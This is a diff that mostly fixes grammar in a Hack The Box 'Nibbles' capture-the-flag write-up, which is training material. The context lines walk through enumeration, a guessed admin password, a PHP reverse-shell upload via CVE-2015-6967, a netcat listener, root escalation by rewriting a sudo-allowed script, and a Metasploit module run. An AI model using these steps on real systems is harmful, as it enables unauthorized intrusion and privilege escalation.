@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # Nibbles (Easy)
 
 ## <mark style="color:blue;">Description</mark>
@@ -57,7 +43,7 @@ nmap 10.129.93.176 -p22,80 -sVC -oN serv_scan.txt
 <figure><img src="../../.gitbook/assets/image (779).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
+To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
 {% endhint %}
 
 ***
@@ -68,7 +54,7 @@ To learn more about the HTTP protocol you can go [here](../../networks/protocols
 
 ***
 
-* After exploring the page, I didn't find anything relevant, the only hint the site gave me was letting me know the site was powered by the _nibbleblog_ CMS. So, in an attempt to find out possible hidden directories or routes, I fuzzed the route with the help of [_gobuster_](../../web-exploitation/tools-and-utilities.md#gobuster) and a dictionary from [_Seclists_](../../web-exploitation/tools-and-utilities.md#daniel-miessler-wordlists)
+* After exploring the page, I didn't find anything relevant; the only hint the site gave me was letting me know the site was powered by the _nibbleblog_ CMS. So, in an attempt to find out possible hidden directories or routes, I fuzzed the route with the help of [_gobuster_](../../web-exploitation/tools-and-utilities.md#gobuster) and a dictionary from [_Seclists_](../../web-exploitation/tools-and-utilities.md#daniel-miessler-wordlists)
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -80,7 +66,7 @@ gobuster dir -u http://10.129.93.176/nibbleblog -w /usr/share/wordlists/SecLists
 
 ***
 
-* I found some interesting routes, being the most relevant the _/admin.php_ route, so I navigated there and found a simple login page. I tried using common credentials to log in but it didn't work
+* I found some interesting routes, the most relevant being the _/admin.php_ route, so I navigated there and found a simple login page. I tried using common credentials to log in, but it didn't work
 
 <figure><img src="../../.gitbook/assets/image (781).png" alt=""><figcaption></figcaption></figure>
 
@@ -92,30 +78,30 @@ gobuster dir -u http://10.129.93.176/nibbleblog -w /usr/share/wordlists/SecLists
 
 ***
 
-* There I found some exposed folders, so I explored the files that were contained there. After examining them I found an interesting file on _/content/private/users.xml_ and accessed it, and noticed this _XML_ document was leaking some information
+* There, I found some exposed folders, so I explored the files that were contained there. After examining them, I found an interesting file on _/content/private/users.xml_ and accessed it, and noticed this _XML_ document was leaking some information
 
 <figure><img src="../../.gitbook/assets/image (784).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* That let me know there was an existing username named _admin_ but it didn't give me any information about a related password, so I kept searching through the files. Then I went to check the &#x63;_&#x6F;nfig.xml_ file and noticed the particular use of the _nibbles_ word many times
+* That let me know there was an existing username named _admin,_ but it didn't give me any information about a related password, so I kept searching through the files. Then I went to check the &#x63;_&#x6F;nfig.xml_ file and noticed the particular use of the _nibbles_ word many times
 
 <figure><img src="../../.gitbook/assets/image (785).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* Even the domain of an email was using this word there, so that could mean that was the enterprise name and turned it into a possible option for a weak password. I tried to log in on the _/admin.php_ page using _admin_ as username and _nibbles_ as password and it let me in successfully to a new dashboard
+* Even the domain of an email was using this word there, so that could mean that was the enterprise name, and turned it into a possible option for a weak password. I tried to log in on the _/admin.php_ page using _admin_ as username and _nibbles_ as password, and it let me in successfully to a new dashboard
 
 <figure><img src="../../.gitbook/assets/image (786).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* After that, I explored the sections of the page searching for any possible vulnerability. As I didn't find anything at first sight, I searched if there were any possible CVEs for this CMS. After a little research, I found a [repository ](https://github.com/dix0nym/CVE-2015-6967)with an exploit for the _CVE-2015-6967_ related to the CMS. That would let me abuse a File Upload vulnerability to gain a reverse shell but I needed to find first a point for uploading a file
+* After that, I explored the sections of the page searching for any possible vulnerability. As I didn't find anything at first sight, I searched if there were any possible CVEs for this CMS. After a little research, I found a [repository ](https://github.com/dix0nym/CVE-2015-6967)with an exploit for the _CVE-2015-6967_ related to the CMS. That would let me abuse a File Upload vulnerability to gain a reverse shell, but I needed to find first a point for uploading a file
 
 <figure><img src="../../.gitbook/assets/image (788).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about File Upload exploitation you can go [here](../../web-exploitation/broken-access-control/abuse-file-upload.md)
+To learn more about File Upload exploitation, you can go [here](../../web-exploitation/broken-access-control/abuse-file-upload.md)
 {% endhint %}
 
 ***
@@ -126,13 +112,13 @@ To learn more about File Upload exploitation you can go [here](../../web-exploit
 
 ***
 
-* There I found some already installed plugins and after exploring them, the _My Image_ plugin caught my attention because it had an option to upload a picture file, a point that I could abuse
+* There I found some already installed plugins, and after exploring them, the _My Image_ plugin caught my attention because it had an option to upload a picture file, a point that I could abuse
 
 <figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* To do so, I could create a script for getting a Reverse Shell and upload it into this section. Also, I confirmed that the page is based on _PHP_ with the help of [_Wappalyazer_](../../web-exploitation/tools-and-utilities.md#wappalyzer), so I created a basic script in this programming language with the payload and uploaded it
+* To do so, I could create a script for getting a Reverse Shell and upload it into this section. Also, I confirmed that the page is based on _PHP_ with the help of [_Wappalyzer_](../../web-exploitation/tools-and-utilities.md#wappalyzer), so I created a basic script in this programming language with the payload and uploaded it
 
 {% code title="RevShell.php" overflow="wrap" lineNumbers="true" %}
 ```php
@@ -143,12 +129,12 @@ To learn more about File Upload exploitation you can go [here](../../web-exploit
 <figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about how to create a script for a Reverse Shell you can go [here](../../scripting/reverse-shell.md)
+To learn more about how to create a script for a Reverse Shell, you can go [here](../../scripting/reverse-shell.md)
 {% endhint %}
 
 ***
 
-* I saw a couple of warnings but the page told me that the file had been uploaded successfully. Then, I had to find out the location where the files were uploaded to execute it. I went back to search and after a while, I found under the _/content/private_ folder, a folder named _plugins._ Going there I found another folder related to the _My Image_ plugin so I went there to check its content&#x20;
+* I saw a couple of warnings, but the page told me that the file had been uploaded successfully. Then, I had to find out the location where the files were uploaded to execute the script. I went back to search and after a while, I found under the _/content/private_ folder, a folder named _plugins._ Going there, I found another folder related to the _My Image_ plugin, so I went there to check its content&#x20;
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -158,7 +144,7 @@ To learn more about how to create a script for a Reverse Shell you can go [here]
 
 ***
 
-* Unfortunately, I found a _PHP_ file named _image.php_ but wasn't the one I had uploaded. Maybe the name had been changed automatically inside the web service, so I tried assuming this only file was the one with my payload for the reverse shell. To confirm this, I created a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener in my machine on the same port specified in the script and then accessed the file
+* Unfortunately, I found a _PHP_ file named _image.php,_ but it wasn't the one I had uploaded. Maybe the name had been changed automatically inside the web service, so I tried assuming this was the file with my payload for the reverse shell. To confirm this, I created a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener on my machine on the same port specified in the script and then accessed the file
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -170,19 +156,19 @@ nc -nvlp 4444
 
 ***
 
-* I observed the page kept loading and checking the listener I noticed I had successfully caught the shell from the web. Then, I sanitized the terminal and checked which user I was, using the `whoami` command and with this I knew I was the _nibbler_ user
+* I observed the page kept loading, and checking the listener, I noticed I had successfully caught the shell from the web. Then, I sanitized the terminal and checked which user I was, using the `whoami` command, and with that, I knew I was the _nibbler_ user
 
 <figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn about the sanitization process you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
+To learn about the sanitization process, you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
 {% endhint %}
 
 ***
 
-* Then I navigated to the _/home_ folder where I found a folder for this user and inside it, a _user.txt_ file from which I got the user flag
+* Then I navigated to the _/home_ folder, where I found a folder for this user, and inside it, a _user.txt_ file from which I got the user flag
 
 <figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -196,7 +182,7 @@ To learn about the sanitization process you can go [here](../../linux/useful-she
 
 ***
 
-* After that, I had to search for a way to escalate privileges. I checked the `sudo` execution permissions that the user had, and it was able to execute a _monitor.sh_ file. But after searching in the filesystem, I didn't find the file
+* After that, I had to search for a way to escalate privileges. I checked the `sudo` execution permissions that the user had, and it was able to execute a _monitor.sh_ file. But after searching inside the filesystem, I didn't find the file
 
 <figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -208,7 +194,7 @@ To learn about the sanitization process you can go [here](../../linux/useful-she
 
 ***
 
-* Knowing this, I tried modifying the content of the script to spawn a shell. I replaced it and checked it had been saved correctly, which the system let me do without issues. Then I ran the script using `sudo` and gained the shell as the _root_ user
+* Knowing this, I tried modifying the content of the script to spawn a shell. I replaced it and checked if it had been saved correctly, which the system let me do without issues. Then I ran the script using `sudo` and gained the shell as the _root_ user
 
 {% code lineNumbers="true" %}
 ```bash
@@ -221,7 +207,7 @@ sudo /monitor.sh
 
 ***
 
-* Finally, I navigated to the _/root_ folder where I found a _root.txt_ file, and reading its content I got the root flag
+* Finally, I navigated to the _/root_ folder where I found a _root.txt_ file, and reading its content, I got the root flag
 
 <figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -248,7 +234,7 @@ msf6 > search nibbleblog
 
 ***
 
-* I found an exploit for a File Upload vulnerability existed, so I entered the context of this exploit and found out what parameters I needed to execute it
+* I found an exploit for a File Upload vulnerability, so I entered the context of this exploit and found out what parameters I needed to execute it
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -261,7 +247,7 @@ msf6 exploit(multi/http/nibbleblog_file_upload) > show options
 
 ***
 
-* I provide the asked parameters and run the script
+* I provide the requested parameters and run the script
 
 ```bash
 msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST 10.10.14.80
@@ -276,6 +262,6 @@ msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog
 
 ***
 
-* After a while, I observed a _meterpreter_ session was spawned, and with this, I gained a shell for the user _nibbler_. With this, I could continue with the rest of the process
+* After a while, I observed that a _meterpreter_ session was spawned, and with this, I gained a shell for the user _nibbler_. With this, I could continue with the rest of the process
 
 <figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
